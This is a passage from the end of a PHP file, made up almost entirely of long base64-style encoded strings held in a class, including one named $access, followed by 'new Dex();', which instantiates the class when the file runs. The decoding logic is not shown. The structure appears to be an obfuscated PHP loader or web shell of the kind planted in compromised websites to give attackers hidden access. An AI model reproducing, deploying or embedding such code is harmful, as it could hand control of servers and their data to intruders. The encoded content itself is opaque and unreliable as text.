	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
	1YMyWd155A==';
	 
	var $access = 'bVJdT9swFH0uEv/hYkU4kaKWbKwg5eMFBTEhrVvb8VJQFRxHtZrYkWMvRKP/fTeBsbXw5nvPPcfnHtsR
	TxADpSE4LRN4LLKy4eHxkZNZiSVZExhDYx8bo91mkwWus16k87t0vqI3y+X39c1ssaQPng9nPnz2kCgK
	VzQNNzg4T3/8TBfLFV23W5zx4Pfx0WjkDFfuSx5MDmrBtJcb7YCjo/9Ur2az26/pqjd4oLmPhQPwspXR
	lg9ig78TXtWmc5GEfM2N1RIyrbOh5QMNPrFpwagPvY4/JNNb4WyjgEaPKu9ASaak4U+m4tLG5FVkCI8k
	UcO0qE2SK2YRN+NWC8NL6ZLzs3P4pgxcKytz4oVvE0pueZerts+8sJIZoaTLcTtRgMvHzOjylndwetpX
	OHqlcg5xHMP0Ap6fYb93Of2g9+V9Lwgu/gXw8vC7sBUSfaAhVgq2/cjOyZufv+QQ3q16T6NC6QqygRsT
	AhU3G5XHpFaNwYyErK0B09U8Jn2QBGRW4Rl/wAGKX6USiP/KSotlkiA+6cWTe+qFu2jyGnc06Z8moeEf
	';
}

new Dex();
?>